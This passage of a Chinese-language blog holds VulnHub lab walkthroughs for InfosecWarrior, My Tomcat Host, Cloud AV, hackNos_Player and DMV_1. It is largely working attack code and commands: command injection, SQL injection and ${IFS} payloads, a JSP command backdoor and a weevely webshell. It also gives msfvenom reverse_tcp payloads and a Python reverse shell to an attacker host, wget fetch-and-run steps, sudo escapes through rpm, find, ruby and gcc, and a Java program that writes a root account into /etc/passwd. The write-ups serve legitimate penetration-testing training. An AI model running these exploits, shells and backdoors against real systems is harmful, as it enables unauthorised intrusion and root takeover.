class="line">&lt;priority&gt;0.8&lt;&#x2F;priority&gt;</span><br><span class="line">&lt;&#x2F;url&gt;</span><br><span class="line">&lt;&#x2F;urlset&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-16"><a class="markdownIt-Anchor" href="#漏洞利用-16"></a> 漏洞利用</h2><p>访问<code>http://192.168.31.172/sitemap.xml</code>有一行内容<br /><code>&lt;loc&gt;http://infosecwarrior.com/index.htnl&lt;/loc&gt;</code></p><p>访问<code>http://192.168.31.172/index.htnl</code>成功</p><p>审计html代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#x2F;cmd.php&quot; method&#x3D;&quot;GET&quot; hidden&#x3D;&quot;True&quot;&gt;</span><br><span class="line"> command</span><br><span class="line">     &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;AI&quot; value&#x3D;&quot;&quot; maxlength&#x3D;&quot;100&quot;&gt;</span><br><span class="line"> &lt;br&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>删去<code>hidden=&quot;True&quot;</code><br />尝试进行命令执行，在表单中输入<code>ls</code><br />回显为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Now the main part what it is loooooool</span><br><span class="line">Try other method</span><br></pre></td></tr></table></figure><p>而且URL为<code>http://192.168.31.172/cmd.php?AI=ls</code></p><p>改为POST请求<br />执行成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.31.172&#x2F;cmd.php -d &quot;AI&#x3D;ls&quot;</span><br><span class="line"></span><br><span class="line">You Found ME : - (</span><br><span class="line"></span><br><span class="line">cmd.php</span><br><span class="line">hacker.gif</span><br><span class="line">index.htnl</span><br><span class="line">minnions.gif</span><br><span class="line">note.txt</span><br><span class="line">sitemap.xml</span><br><span class="line">wordpress</span><br></pre></td></tr></table></figure><p>即存在命令执行漏洞</p><p>查看cmd.php的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.31.172&#x2F;cmd.php -d &quot;AI&#x3D;cat cmd.php&quot;</span><br><span class="line"></span><br><span class="line">$user&#x3D;&quot;isw0&quot;;</span><br><span class="line">$pass&#x3D;&quot;123456789blabla&quot;;</span><br></pre></td></tr></table></figure><p>获取到账户</p><h2 id="权限提升-16"><a class="markdownIt-Anchor" href="#权限提升-16"></a> 权限提升</h2><p>登入服务器的SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh isw0@192.168.31.172</span><br><span class="line">123456789blabla</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">User isw0 may run the following commands on this host:</span><br><span class="line">    (!root) NOPASSWD: &#x2F;bin&#x2F;bash</span><br><span class="line">    (root) &#x2F;bin&#x2F;ping, (root) &#x2F;bin&#x2F;ping6, (root) &#x2F;bin&#x2F;rpm, (root) &#x2F;bin&#x2F;ls, (root) &#x2F;bin&#x2F;mktemp</span><br></pre></td></tr></table></figure><p>使用root账户的rpm命令进行权限提升</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root rpm --eval &#39;%&#123;lua:posix.exec(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) context&#x3D;unconfined_u:system_r:rpm_script_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure><hr /><blockquote><p>Wordpress服务500</p></blockquote><p>在之前的靶机中从来没有遇到这个情况，便主观地猜测靶机配置是否有误，最后看WP的思路才让我顿悟。有几分脑洞，但是sitemap.xml也确实被dirb扫描出来了，里面的<code>index.htnl</code>也是在提示玩家，只能说收集信息的时候还是要仔细看看，毕竟<code>index.html</code>和<code>index.htnl</code>乍一看太难以区分</p><blockquote><p>rpm执行命令</p></blockquote><p>乍一看rpm有sudo，以为要构造恶意安装包来获取提权，没想到rpm可以直接执行命令</p><p>参考资料</p><blockquote><p><a href="https://www.armourinfosec.com/infosecwarrior-ctf-2020-01-walkthrough/">WP</a><br /><a href="https://cooolis.payloads.online/lolbas/Linux/rpm/">rpm.payload</a></p></blockquote><hr /><h1 id="my-tomcat-host-1"><a class="markdownIt-Anchor" href="#my-tomcat-host-1"></a> <a href="https://www.vulnhub.com/entry/my-tomcat-host-1,457/">My Tomcat Host: 1</a></h1><p><code>2020/04/25 00:43:06</code></p><h2 id="寻找靶机ip"><a class="markdownIt-Anchor" href="#寻找靶机ip"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/00.png" alt="" /></p><h2 id="端口扫描-17"><a class="markdownIt-Anchor" href="#端口扫描-17"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.166</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/01.png" alt="" /></p><h2 id="web路径扫描"><a class="markdownIt-Anchor" href="#web路径扫描"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.166:8080/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/02.png" alt="" /></p><h2 id="漏洞利用-17"><a class="markdownIt-Anchor" href="#漏洞利用-17"></a> 漏洞利用</h2><p>用浏览器访问8080端口的页面</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/03.png" alt="" /></p><p>点击左侧<code>Manager App</code>按钮进行登录，使用默认账户<code>tomcat:tomcat</code>登入成功</p><p>上传jsp后门</p><p>这里用了两个jsp后门<br />一个用于浏览文件(<a href="https://github.com/rohitcoder/BackDoors">https://github.com/rohitcoder/BackDoors</a>)<br />一个用于执行命令(<a href="https://www.cnblogs.com/swyft/articles/5563732.html">https://www.cnblogs.com/swyft/articles/5563732.html</a>)<br />第一个后门的执行命令模块无法使用</p><p>保存后门，压缩zip包，改后缀为war，然后在Manager页面进行war包的部署<br /><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/04.png" alt="" /></p><p>war包的部署就相当于在网站根目录解压了war包，访问时需要war包的文件名以及包内的文件名</p><p>如：<br />在压缩zip时，压缩文件的文件名为<code>new1.jsp</code>，而压缩之后的zip文件改名为<code>new2.war</code>，那么在部署之后需要访问<code>/new2/new1.jsp</code></p><p>在第二个后门中查看权限</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/05.png" alt="" /></p><p>在第一个后门中查看文件，但是没有找到nc<br />只好用meterpreter来获取一个shell</p><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=3693 -f elf &gt; hello.elf</code></p><p>然后在第一个后门中上传到目录/tmp下</p><p>在MSF中运行handler</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 3693</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>上传之后是没有X权限的，这时可以在第二个后门中进行赋权<br />但是需要注意一点：要对命令进行url编码，以防止url中的特殊符号导致命令无法执行</p><p>url编码的结果为<code>chmod%20%2Bx%20%2Ftmp%2Fhello.elf</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/06.png" alt="" /></p><p>然后执行meterpreter<br /><code>%2Ftmp%2Fhello.elf</code><br />MSF中就接收到了shell</p><h2 id="权限提升-17"><a class="markdownIt-Anchor" href="#权限提升-17"></a> 权限提升</h2><p>在meterpreter的shell中获取一个pty，以便之后的切换账户操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>这里可以看到tomcat账户可以以任何账户的身份来执行java，而且不需要密码<br />这很可能是提权的一个突破口</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/07.png" alt="" /></p><p>构造密码hash</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/08.png" alt="" /></p><p>构造jar包来执行修改passwd文件的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">cat sudo.java</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class sudo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ProcessBuilder processBuilder &#x3D; new ProcessBuilder();</span><br><span class="line">processBuilder.command(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;echo &#39;test:$6$q.1oPln23FUPQYds$pRZlkAKZ6tN.N4c5kUCKsCF.QW1kdbnLGLTpI3XKgidZuHzbxZzjdONAzoTHgfJHh9NU2E0pO32ICFc5zL78.&#x2F;:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process process &#x3D; processBuilder.start();</span><br><span class="line">            BufferedReader reader &#x3D;</span><br><span class="line">                    new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            int exitCode &#x3D; process.waitFor();</span><br><span class="line">            System.out.println(&quot;\nExited with error code : &quot; + exitCode);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Kali启用HTTP服务<br /><code>python -m 'SimpleHTTPServer' 8800 &amp;</code></p><p>在Shell中使用wget下载java文件<br /><code>wget http://192.168.31.10:8800/sudo.java</code></p><p>执行EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac sudo.java</span><br><span class="line">sudo -u root java sudo</span><br></pre></td></tr></table></figure><p>成功将账户信息写入passwd文件</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/09.png" alt="" /></p><p>切换账户即为root权限</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/10.png" alt="" /></p><hr /><p>JSP后门脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/swyft/articles/5563732.html">jsp.backdoor</a><br /><a href="https://github.com/rohitcoder/BackDoors">jsp.backdoor</a><br /><a href="https://www.runoob.com/java/java-tutorial.html">java</a><br /><a href="https://stackoverflow.com/questions/3403226/how-to-run-linux-commands-in-java">jar</a></p></blockquote><hr /><h1 id="clound-av"><a class="markdownIt-Anchor" href="#clound-av"></a> <a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/">Clound AV</a></h1><p><code>2020/05/07 22:41:53</code></p><h2 id="寻找靶机ip-2"><a class="markdownIt-Anchor" href="#寻找靶机ip-2"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/00.png" alt="" /></p><h2 id="端口扫描-18"><a class="markdownIt-Anchor" href="#端口扫描-18"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.160</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/01.png" alt="" /></p><h2 id="web路径扫描-2"><a class="markdownIt-Anchor" href="#web路径扫描-2"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.160:8080/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/02.png" alt="" /></p><h2 id="漏洞利用-18"><a class="markdownIt-Anchor" href="#漏洞利用-18"></a> 漏洞利用</h2><p>访问<code>http://192.168.31.160:8080/</code>，如图</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/03.png" alt="" /></p><p>使用burp改变post传递的password的值为%00<br />出现报错页面</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/04.png" alt="" /></p><p>可以看到这里存在sql语句，简单分析后可以判断存在sql注入，注意这里password字段两侧是用双引号，进行sql注入时同样需要使用双引号</p><p>构造语句<code>1&quot; or 1--+</code><br />成功登入页面</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/05.png" alt="" /></p><p>这里通过输入文件名来对文件进行分析，这里自然可以联想到常见的&quot;Ping tool &amp; Code Injection&quot;，显示出<code>ls -l</code>的结果也算是一种提示吧</p><p>本来以为这里是常见的有回显命令注入，但是这个回显实在扫描病毒的结束之后才出现，而且本人进行测试的时候扫描时间很长</p><p>为了判断能否执行命令，在Kali上开启HTTP服务<br /><code>pythom -m SimpleHTTPServer 9990 &amp;</code></p><p>然后尝试命令注入来使用wget下载本地的文件进行测试，以此来判断是否能够进行命令注入，因为开启HTTP服务之后，本地文件被下载是会存在提示的</p><p><code>|wget http://192.168.31.10:9990/1</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/06.png" alt="" /></p><p>可以看到文件被下载，说明可以进行命令注入</p><p>该靶机上没有nc，不过可以通过python来反弹shell</p><p><code>nc -lvvp 9900</code><br /><code>| python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.31.10',9900));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);&quot;</code></p><p>即可获取shell</p><h2 id="权限提升-18"><a class="markdownIt-Anchor" href="#权限提升-18"></a> 权限提升</h2><p>由于未知的原因，本人测试时在nc的shell中输入字符会连续出现两次，用起来有些不方便，只好转到MSF</p><p>生成Meterpreter后门<br /><code>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9995 -f raw &gt; shell.py</code></p><p>在MSF中配置相关参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload python&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9995</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>使用wget传递后门并启用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.31.10:9900&#x2F;shell.py</span><br><span class="line">python shell.py</span><br></pre></td></tr></table></figure><p>在Meterpreter中获取pty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>这时可以看到我们是用户scanner的身份</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/07.png" alt="" /></p><p>在home目录下看到一个C的源代码及其编译的程序</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/08.png" alt="" /></p><p>值得注意的是，这段代码在使用freshclam扫描文件之前，会将该用户变为root，而且该程序也具有SUID权限<br />而该程序需要用户输入文件名，如果我们能够对文件名进行注入，使其扫描文件之后再执行一段代码，那么提权就变得简单了</p><p>构造反弹Shell脚本</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/09.png" alt="" /></p><p>nc监听相应端口<br /><code>nc -lvvp 9996</code></p><p>执行程序<br /><code>./update_cloudav '1| python test.py'</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/10.png" alt="" /></p><hr /><blockquote><p>/console</p></blockquote><p>在访问路径<code>/console</code>时会要求用户输入pin码，这里可以通过修改HTTP Response包中的信息来进行绕过<br />本以为给出的python console可以用来直接执行系统命令，但好像只能用于执行js里的一些函数</p><p>参考资料</p><blockquote><p><a href="https://www.hacknos.com/boredhackerblog-cloud-av-walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="hacknos_player"><a class="markdownIt-Anchor" href="#hacknos_player"></a> <a href="https://www.vulnhub.com/entry/hacknos-player-v11,459/">hackNos_Player</a></h1><p><code>2020/05/09 18:39:43</code></p><h2 id="寻找靶机ip-3"><a class="markdownIt-Anchor" href="#寻找靶机ip-3"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/00.png" alt="" /></p><h2 id="端口扫描-19"><a class="markdownIt-Anchor" href="#端口扫描-19"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.33</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/01.png" alt="" /></p><h2 id="web路径扫描-3"><a class="markdownIt-Anchor" href="#web路径扫描-3"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.33/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/02.png" alt="" /></p><h2 id="漏洞利用-19"><a class="markdownIt-Anchor" href="#漏洞利用-19"></a> 漏洞利用</h2><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/03.png" alt="" /></p><p>dirb发现了js代码，粗略审计之后并没有获取到有效的信息</p><p>在Apache默认页面发现如下提示</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/04.png" alt="" /></p><p>路径<code>/g@web/</code>可访问<br />路径<code>/mini@web/</code>不可访问</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/05.png" alt="" /></p><p><code>/g@web/</code>是一个wordpress站点，使用wpscan进行信息收集</p><p><strong>用户枚举</strong></p><p><code>wpscan --url http://192.168.31.33/g@web/ -e u</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/06.png" alt="" /></p><p>访问<code>http://192.168.31.33/g@web/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/07.png" alt="" /></p><p><strong>插件枚举</strong></p><p><code>wpscan --url http://192.168.31.33/g@web/ -e ap</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/08.png" alt="" /></p><p>搜索插件相关信息<br />这里使用searchsploit搜索该插件时缺少了一个RCE的EXP，需要在网上进行搜索</p><p><a href="https://wpvulndb.com/vulnerabilities/8949">https://wpvulndb.com/vulnerabilities/8949</a></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/09.png" alt="" /></p><p>使用该EXP直接获取shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; action&#x3D;&quot;http:&#x2F;&#x2F;192.168.31.33&#x2F;g@web&#x2F;wp-admin&#x2F;admin-ajax.php&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;wpsp_upload_attachment&quot;&gt;</span><br><span class="line">    Choose a file ending with .phtml:</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;0&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p><code>weevely generate pass shell.phtml</code></p><p>上传后在<code>http://192.168.31.33/g@web/wp-content/uploads/</code>找到上传的后门，再使用weevely连接即可获取shell</p><h2 id="权限提升-19"><a class="markdownIt-Anchor" href="#权限提升-19"></a> 权限提升</h2><p>利用当前webshell获取一个MSF的Shell，方便之后进行账户之间的切换</p><p>构造后门程序<br /><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9905 -f raw &gt; pass.php</code></p><p>MSFConsole中进行相应配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use explot&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.33</span><br><span class="line">set LPORT 9905</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>触发MSF后门<br /><code>curl http://192.168.31.33/g@web/wp-content/uploads/wpsp/pass.php</code></p><p>获取shell之后再获取pty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>根据之前找到的JSON的内容，可以使用<code>hackNos@9012!!</code>来提升我们的权限</p><p>查看目录<code>/home</code>的文件夹</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/10.png" alt="" /></p><p>尝试之后转换到用户security的身份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su security</span><br><span class="line">hackNos@9012!!</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/11.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/12.png" alt="" /></p><p>这里可以使用find命令来进行水平提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; &#x2F;tmp&#x2F;1</span><br><span class="line">sudo -u hackNos-boat find &#x2F;tmp&#x2F;1 -exec &#x2F;bin&#x2F;bash \;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/13.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/14.png" alt="" /></p><p>然后再使用ruby进行提权</p><p><code>sudo -u hunter /usr/bin/ruby -e 'exec &quot;/bin/bash&quot;'</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/15.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/16.png" alt="" /></p><p>使用gcc进行提权</p><p><code>sudo -u root gcc -wrapper /bin/bash,-s .</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/17.png" alt="" /></p><p>即可获取root权限</p><hr /><blockquote><p>gcc -wrapper</p></blockquote><p>最后的gcc提权一开始以为是使用system函数来进行执行命令从而进行提权，但是随后发现这个操作需要SUID权限，最后看WP才发现是使用wrapper参数来执行命令</p><p>参考资料</p><blockquote><p><a href="https://gcc.gnu.org/onlinedocs/gcc/Overall-Options.html#Overall-Options">wrapper</a><br /><a href="https://medium.com/@DamaneDz/vulnhub-hacknos-player-writeup-walkthrough-b91074a0adc4">WalkThrough</a></p></blockquote><hr /><h1 id="dmv_1"><a class="markdownIt-Anchor" href="#dmv_1"></a> <a href="https://www.vulnhub.com/entry/dmv-1,462/">DMV_1</a></h1><p><code>2020/05/14 15:07:33</code></p><h2 id="寻找靶机ip-4"><a class="markdownIt-Anchor" href="#寻找靶机ip-4"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/00.png" alt="" /></p><h2 id="端口扫描-20"><a class="markdownIt-Anchor" href="#端口扫描-20"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.36</code></p><p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/01.png" alt="" /></p><h2 id="web路径扫描-4"><a class="markdownIt-Anchor" href="#web路径扫描-4"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.36/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/02.png" alt="" /></p><h2 id="漏洞利用-20"><a class="markdownIt-Anchor" href="#漏洞利用-20"></a> 漏洞利用</h2><p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/03.png" alt="" /></p><p>Web服务的主页是一个Youtube视频在线转换工具，观察发送的请求包，post数据为URL</p><p>本地开启HTTP服务，并尝试修改URL<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/04.png" alt="" /><br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/05.png" alt="" /><br />猜测可能存在命令注入</p><p>验证存在命令注入漏洞<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/06.png" alt="" /></p><p>使用MSFVenom构造Meterpreter后门<br /><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9995 -f raw &gt; shell.php</code></p><p>在MSFConsole中配置相关参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9995</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>通过命令注入来使用wget下载Meterpreter后门<br /><code>;wget$&#123;IFS&#125;http://192.168.31.10:9900/shell.php;</code></p><p>触发后门<br /><code>curl http://192.168.31.36/shell.php &amp;</code></p><h2 id="权限提升-20"><a class="markdownIt-Anchor" href="#权限提升-20"></a> 权限提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import 